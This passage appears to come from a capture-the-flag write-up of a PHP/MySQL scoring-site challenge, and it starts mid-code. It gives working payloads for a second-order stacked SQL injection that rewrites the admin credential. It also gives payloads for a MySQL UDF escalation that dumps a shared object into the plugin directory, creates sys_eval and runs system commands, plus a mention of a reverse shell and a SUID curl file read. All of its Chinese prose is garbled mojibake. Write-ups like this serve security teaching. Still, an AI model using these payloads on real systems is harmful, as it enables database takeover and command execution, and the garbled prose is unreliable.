double-quoted-string">"')"</span><span class="token punctuation">;</span></code></pre>

<p>è¿™é‡Œç”±äºä¸€ç‚¹ç‚¹å°é—®é¢˜å¯¼è‡´æ²¡æœ‰å¯¹q1-5è¿›è¡Œåˆæ³•æ€§éªŒè¯ï¼Œæ‰€ä»¥å¯¼è‡´åœ¨è¿™é‡Œå³å¯ç›´æ¥ä½¿ç”¨å †å æ³¨å…¥è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œï¼Œè¿™é‡Œçš„è€ƒç‚¹æ˜¯äºŒæ¬¡æ³¨å…¥ï¼Œåˆ©ç”¨<code>username</code>è¿›è¡Œå †å æ³¨å…¥ï¼Œä¿®æ”¹adminçš„<code>studentid</code>ï¼Œä»è€Œç™»å½•è·å–adminã€‚ç”±äºå¢åŠ revengeä¼šå¯¼è‡´åŸæœ‰åˆ†æ•°ç»“æ„è¢«ç ´å<del>(å’±å°±æ˜¯ä¸ªæ–°ç”Ÿèµ›)</del>ï¼Œå› æ­¤æ¯”èµ›è¿‡ç¨‹ä¸­å°±æ²¡æœ‰å¯¹é¢˜ç›®åšä¿®æ”¹å•¦ã€‚</p>
<p><strong>ç°é¢˜ç›®å·²ç»ä¿®æ”¹å®Œæ¯•ï¼Œå¢åŠ äº†å¯¹q1-5çš„åˆæ³•æ€§éªŒè¯ï¼Œæ— æ³•åœ¨q1-5å¤„è¿›è¡Œæ³¨å…¥äº†ï¼Œé™„ä»¶ä¹Ÿå°†ä¼šåŒæ­¥æ›´æ–°ã€‚</strong></p>
<p>å› ä¸ºé€šç¯‡æ¥çœ‹ï¼Œåªæœ‰è¿™å¤„æœªå¯¹<code>username</code>è½¬ä¹‰ï¼Œè€Œä¸”æ­¤å¤„è¿›è¡Œäº†<code>multi_query</code>ï¼Œæ‰€ä»¥å¯ä»¥å¦‚æœæ­¤å¤„å­˜åœ¨æ³¨å…¥ç‚¹çš„è¯å°±å¯ä»¥è¿›è¡Œå †å æ³¨å…¥ã€‚</p>
<p>é¦–å…ˆå°è¯•é—­åˆï¼Œå¯ä»¥çœ‹åˆ°å¦‚æœæˆ‘çš„usernameä¸º</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">a&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;1&#39;);update users set studentid&#x3D;&#39;&#123;passwd&#125;&#39; where username&#x3D;&#39;admin&#39;;</code></pre>

<p>é‚£ä¹ˆæ‰§è¡Œçš„sqlè¯­å¥å°±å˜æˆäº†è¿™æ ·</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">...;insert into userAnswer values (NULL, &#39;a&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;1&#39;);update users set studentid&#x3D;&#39;admin_passwd&#39; where username&#x3D;&#39;admin&#39;;#&#39;, &#39;1&#39;, &#39;1&#39;, &#39;1&#39;, &#39;1&#39;, &#39;1&#39;)&quot;;</code></pre>

<p>æ‰§è¡Œåå°±æ›´æ”¹äº†adminçš„<code>studentid</code>ä¸º<code>admin_passwd</code>ï¼Œå°±å¯ä»¥ç™»å½•åˆ°<code>score.php</code>äº†ã€‚</p>
<h3 id="udfææƒ"><a href="#udfææƒ" class="headerlink" title="udfææƒ"></a>udfææƒ</h3><h4 id="å‰ææ¡ä»¶"><a href="#å‰ææ¡ä»¶" class="headerlink" title="å‰ææ¡ä»¶"></a>å‰ææ¡ä»¶</h4><p>æ ¹æ®é™„ä»¶<code>init.sql</code>ï¼Œctfç”¨æˆ·æ‹¥æœ‰<code>*.*</code>çš„<code>file</code>å’Œ<code>insert</code>æƒé™</p>
<img src="/article/eruditeFlower/image-20220718201604798.png" class="" title="image-20220718201604798" loading="lazy">

<p>(è¿™é‡Œscoreåº“çš„æƒé™é…ç»™è¿›è¡Œè¿‡ä¿®æ”¹ï¼ŒåŸå› æ˜¯æœ‰äººæäº‹ï¼Œè¿™ä¸ªä¼šåœ¨åé¢çš„å‡ºé¢˜ç¬”è®°ä¸­ç»†è¯´)</p>
<p>åŒæ—¶æ ¹æ®é™„ä»¶ç»™çš„<code>my.cnf</code>ï¼Œé…ç½®æ–‡ä»¶éƒ½æ˜¯é»˜è®¤é…ç½®ï¼Œä¸”<code>secure-file-priv</code>ç›´æ¥ç»™åˆ°äº†pluginç›®å½•ä¸‹</p>
<img src="/article/eruditeFlower/image-20220718201827284.png" class="" title="image-20220718201827284" loading="lazy">

<p>ä¸”<code>init.sql</code>çš„<code>score.ctf</code>è¡¨ä¹Ÿå†™æ˜äº†<code>flag_in_/flag</code>ï¼Œè¦ä¹ˆé€šè¿‡è¯»å–æ–‡ä»¶çš„æ–¹å¼å°†flagè¯»å…¥è·å–ï¼Œè¦ä¹ˆudfææƒï¼Œæ“ä½œç³»ç»Ÿå‡½æ•°ã€‚</p>
<h4 id="å†™å…¥-soæ–‡ä»¶"><a href="#å†™å…¥-soæ–‡ä»¶" class="headerlink" title="å†™å…¥.soæ–‡ä»¶"></a>å†™å…¥.soæ–‡ä»¶</h4><p>ç”±äºæœåŠ¡å™¨æ˜¯linux-x64ï¼Œåœ¨githubé€‰å–åˆé€‚çš„.soæ–‡ä»¶æˆ–è€…è‡ªå·±ç¼–è¯‘ï¼Œæœ¬åœ°ä½¿ç”¨selectè·å–å…¶hexå€¼ã€‚</p>
<p><code>select hex(load_file(&#39;/usr/lib64/mysql/plugin/exp.so&#39;))</code>å¾—åˆ°å€¼å¦‚ä¸‹</p>
<pre class="language-hex" data-language="hex"><code class="language-hex">0x7F454C460201...</code></pre>

<p>å¤ªé•¿äº†ï¼Œexpé‡Œæœ‰å†™ï¼Œè¿™é‡Œå°±ä¸å†å±•ç¤ºäº†</p>
<p>åœ¨<code>score.php</code>çš„54-55è¡Œï¼Œç”±äºæœ¬é¡µé¢å¯¹adminå¼€æ”¾ï¼Œæ‰€ä»¥æ²¡æœ‰è¿›è¡Œå¯ä¿¡éªŒè¯ï¼Œç›´æ¥å­˜åœ¨æ³¨å…¥ã€‚</p>
<p>åŒæ ·åˆ©ç”¨äºŒæ¬¡æ³¨å…¥ï¼Œå…ˆé—­åˆåä½¿ç”¨dump fileå†™å…¥.soæ–‡ä»¶</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">aaa&#39;;select &lt;0x7F...&gt; into dumpfile &#39;&#x2F;usr&#x2F;lib64&#x2F;mysql&#x2F;plugin&#x2F;exp.so&#39;;#</code></pre>

<h4 id="åˆ›å»ºudf"><a href="#åˆ›å»ºudf" class="headerlink" title="åˆ›å»ºudf"></a>åˆ›å»ºudf</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">aaa&#39;;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;exp.so&#39;;#</code></pre>

<h4 id="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"><a href="#æ‰§è¡Œç³»ç»Ÿå‘½ä»¤" class="headerlink" title="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">aaa&#39;;select sys_eval(&#39;id&#39;);#</code></pre>

<h3 id="æœ€ç»ˆæ­¥éª¤"><a href="#æœ€ç»ˆæ­¥éª¤" class="headerlink" title="æœ€ç»ˆæ­¥éª¤"></a>æœ€ç»ˆæ­¥éª¤</h3><p>è¿™é‡Œç›´æ¥å¼¹ä¸ªshellå›æ¥ï¼Œç›´æ¥<code>cat /flag</code>ï¼Œæ²¡æœ‰æƒé™ï¼Œå¯»æ‰¾æœ‰suidä½çš„ç¨‹åºcurlï¼Œæ‰§è¡Œ<code>curl file:///flag</code>è·å¾—flag</p>
<img src="/article/eruditeFlower/image-20220718203220152.png" class="" title="image-20220718203220152" loading="lazy">





<h2 id="è¯¦ç»†åˆ†æ"><a href="#è¯¦ç»†åˆ†æ" class="headerlink" title="è¯¦ç»†åˆ†æ"></a>è¯¦ç»†åˆ†æ</h2><h3 id="åˆ†æç½‘ç«™æµç¨‹"><a href="#åˆ†æç½‘ç«™æµç¨‹" class="headerlink" title="åˆ†æç½‘ç«™æµç¨‹"></a>åˆ†æç½‘ç«™æµç¨‹</h3><p>é¦–å…ˆæ‰“å¼€æ˜¯ä¸»ç•Œé¢(index.php)ï¼Œæœ‰æ³¨å†Œ(register.php)ï¼Œç™»å½•(login.php)ï¼ŒæŸ¥è¯¢(score.php)å’Œæ’å(rank.php)å››ä¸ªç•Œé¢ã€‚</p>
<img src="/article/eruditeFlower/image-20220718194746609.png" class="" title="image-20220718194746609" loading="lazy">

<p>æ³¨å†Œå’Œç™»å½•éƒ½éå¸¸çš„æœ´å®æ— åï¼Œæ²¡å•¥å¥½è¯´çš„</p>
<img src="/article/eruditeFlower/image-20220718194810642.png" class="" title="image-20220718194810642" loading="lazy">

<img src="/article/eruditeFlower/image-20220718194821729.png" class="" title="image-20220718194821729" loading="lazy">

<h4 id="register"><a href="#register" class="headerlink" title="register"></a>register</h4><p>æŒ‰æµç¨‹é¦–å…ˆçœ‹çœ‹æ³¨å†Œ</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'studentid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ä½ æƒ³å¹²å•¥ï¼Ÿ'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">''</span> <span class="token operator">||</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'studentid'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">''</span> <span class="token operator">||</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token string single-quoted-string">'æäº¤'</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"æäº‹æäº‹æäº‹.jpg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token operator">...</span><span class="token operator">...</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>å¦‚æœpostäº†<code>username</code>å’Œ<code>studentid</code>é‚£ä¹ˆå°±è¿›å…¥äº†æ³¨å†Œæµç¨‹ï¼Œåˆ¤æ–­<code>$username===&#39;admin&#39;</code>ï¼Œè¿™é‡Œæœ‰ä¸ªå°æ’æ›²ï¼ŒåŸå…ˆå†™çš„æ˜¯<code>==</code>å¯¼è‡´å¯ä»¥ç›´æ¥%00æˆªæ–­ï¼Œè¿™ä¸ªé—®é¢˜åœ¨ä¸‹é¢ä¼šè¯´</p>
<p>ç„¶åå°±æ˜¯æ³¨å†Œæµç¨‹äº†</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">connect_errno</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"something err0r!&lt;br>å§“åæˆ–å­¦å·é‡å¤"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>ç»“åˆä¸€ä¸‹<code>init.sql</code>æ–‡ä»¶çœ‹ä¸€ä¸‹</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token identifier"><span class="token punctuation">`</span>users<span class="token punctuation">`</span></span> <span class="token punctuation">(</span>
  <span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token keyword">unsigned</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">AUTO_INCREMENT</span><span class="token punctuation">,</span>
  <span class="token identifier"><span class="token punctuation">`</span>username<span class="token punctuation">`</span></span> <span class="token keyword">mediumtext</span><span class="token punctuation">,</span>
  <span class="token identifier"><span class="token punctuation">`</span>studentid<span class="token punctuation">`</span></span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
  <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span><span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token keyword">UNIQUE</span> <span class="token keyword">KEY</span> <span class="token identifier"><span class="token punctuation">`</span>studentid<span class="token punctuation">`</span></span> <span class="token punctuation">(</span><span class="token identifier"><span class="token punctuation">`</span>studentid<span class="token punctuation">`</span></span><span class="token punctuation">)</span>
<span class="token punctuation">)</span> <span class="token keyword">ENGINE</span><span class="token operator">=</span><span class="token keyword">InnoDB</span> <span class="token keyword">AUTO_INCREMENT</span><span class="token operator">=</span><span class="token number">11</span> <span class="token keyword">DEFAULT</span> <span class="token keyword">CHARSET</span><span class="token operator">=</span>utf8<span class="token punctuation">;</span></code></pre>

<p>å¯ä»¥çœ‹åˆ°åœ¨.sqlæ–‡ä»¶ä¸­<code>studentid</code>æ˜¯å”¯ä¸€çš„ï¼Œæ‰€ä»¥é‡å¤å°±ä¼šæŠ¥é”™</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯æ³¨å†Œäº†ï¼Œé…åˆæ³¨é‡Šé£Ÿç”¨ï½</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">// åœ¨æ’å…¥å‰å…ˆæŸ¥ä¸€ä¸‹usersè¡¨æ˜¯å¦æœ‰æ­¤$studentid</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select * from users where studentid='<span class="token interpolation"><span class="token variable">$studentid</span></span>'"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// $result->num_rowså¦‚æœæœ‰ä»»ä½•å€¼ï¼Œé‚£å°±è¡¨ç¤ºé‡å¤äº†</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert(\"ç”¨æˆ·å·²å­˜åœ¨\");&lt;/script>"</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// è¿™é‡Œæ˜¯é€‰é¢˜æ“ä½œï¼Œé¦–å…ˆcountä¸€ä¸‹é¢˜åº“æ•°é‡ï¼Œç„¶åéšæœºé€‰5é“é¢˜ç›®å‡ºæ¥</span>
    <span class="token variable">$arrend</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select count(*) from challengesAll"</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">fetch_row</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">getRandom</span><span class="token punctuation">(</span><span class="token variable">$arrend</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// ä¸¤å¥insertå †å ï¼Œç”±äº$usernameå’Œ$studentidéƒ½ç»è¿‡è½¬ä¹‰å¤„ç†äº†ï¼Œæ‰€ä»¥ä¸ä¼šå­˜åœ¨æ³¨å…¥çš„æƒ…å†µå‘ç”Ÿï¼Œå½“ç„¶ çœŸçš„å—ï¼Ÿ</span>
    <span class="token comment">// è¿™ä¸€å¥æ˜¯æ’å…¥ç”¨æˆ·</span>
    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into users values (NULL, '<span class="token interpolation"><span class="token variable">$username</span></span>', '<span class="token interpolation"><span class="token variable">$studentid</span></span>');"</span><span class="token punctuation">;</span>
    <span class="token comment">// è¿™ä¸€å¥æ˜¯æ’å…¥ç”¨æˆ·å’Œéšæœºåˆ°çš„é¢˜ç›®ï¼Œæ¯ä¸ªç”¨æˆ·é¢˜ç›®æ˜¯åœ¨æ³¨å†Œçš„åŒæ—¶å°±é€‰å®šå¥½å¹¶æ’å…¥åˆ°randChallengesè¡¨ä¸­çš„</span>
    <span class="token variable">$query</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"insert into randChallenges values (NULL, '<span class="token interpolation"><span class="token variable">$username</span></span>', '<span class="token interpolation"><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></span>', '<span class="token interpolation"><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span></span>', '<span class="token interpolation"><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span></span>', '<span class="token interpolation"><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span></span>', '<span class="token interpolation"><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span></span>');"</span><span class="token punctuation">;</span>
    <span class="token comment">// æˆåŠŸåè·³è½¬loginç•Œé¢</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">multi_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">TRUE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"something errorï¼"</span><span class="token operator">.</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h4 id="login"><a href="#login" class="headerlink" title="login"></a>login</h4><p>è¿˜æ˜¯ä¸€æ ·ï¼Œé¦–å…ˆåˆ¤æ–­æ˜¯å¦ç™»å½•ï¼Œç™»å½•è¿‡äº†å°±è·³å›ä¸»ç•Œé¢ï¼Œpostä¿©å‚æ•°å°±è¿›å…¥ç™»å½•æµç¨‹ï¼Œé…åˆæ³¨é‡Šé£Ÿç”¨ï½</p>
<pre class="language-php" data-language="php"><code class="language-php">
<span class="token comment">// ç»å…¸ç™»å½•è¯­å¥ï¼Œ$usernameå’Œ$studentidéƒ½ç»è¿‡äº†addslashes_deepè½¬ä¹‰</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select * from users where username='<span class="token interpolation"><span class="token variable">$username</span></span>' and studentid='<span class="token interpolation"><span class="token variable">$studentid</span></span>'"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span> <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">,</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'studentid'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'studentid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		
    <span class="token comment">// å¦‚æœç™»å½•äº†adminå°±é‡ç½®adminå¯†ç ï¼Œè¿™é‡Œåœ¨ä¸‹æ–¹è¿˜ä¼šå†è®²</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      <span class="token variable">$random</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"update users set studentid='<span class="token interpolation"><span class="token variable">$random</span></span>' where username='admin'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯ QAQ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h4 id="index"><a href="#index" class="headerlink" title="index"></a>index</h4><p>ä¸‹é¢å°±æ˜¯æœ€å¤§å¤´çš„indexéƒ¨åˆ†äº†</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token delimiter important">?></span></span>
  // å¦‚æœç™»å½•å°±ç»™å‡ºç™»å‡ºæŒ‰é’®
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui--appbar-height<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logout.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>ç™»å‡º<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>
  <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
  <span class="token comment">// å¦‚æœæ˜¯adminå°±ç»™å‡ºå•ç‹¬æŸ¥æˆç»©çš„ç•Œé¢</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span> <span class="token delimiter important">?></span></span>
    æŸ¥è¯¢<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui--appbar-height<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>score.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>æˆç»©<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>æˆ–<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui--appbar-height<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>rank.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>æ’å<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>
    <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token comment">// å¹¶ä¸”ä¸å†ç»§ç»­å¾€ä¸‹</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                       <span class="token punctuation">&#125;</span>
<span class="token keyword">endif</span><span class="token punctuation">;</span>
<span class="token comment">// ä¸‹é¢æ˜¯æ™®é€šç”¨æˆ·çš„æµç¨‹</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$mysqli</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token constant">MYSQL_HOST</span><span class="token punctuation">,</span> <span class="token constant">MYSQL_USER</span><span class="token punctuation">,</span> <span class="token constant">MYSQL_PASSWORD</span><span class="token punctuation">,</span> <span class="token constant">MYSQL_DATABASE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"set names utf8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// æ£€æŸ¥scoreè¡¨æ˜¯å¦æœ‰åˆ†äº†ï¼Œæœ‰åˆ†å°±è¡¨ç¤ºåšè¿‡äº†</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select * from score where username='"</span><span class="token operator">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
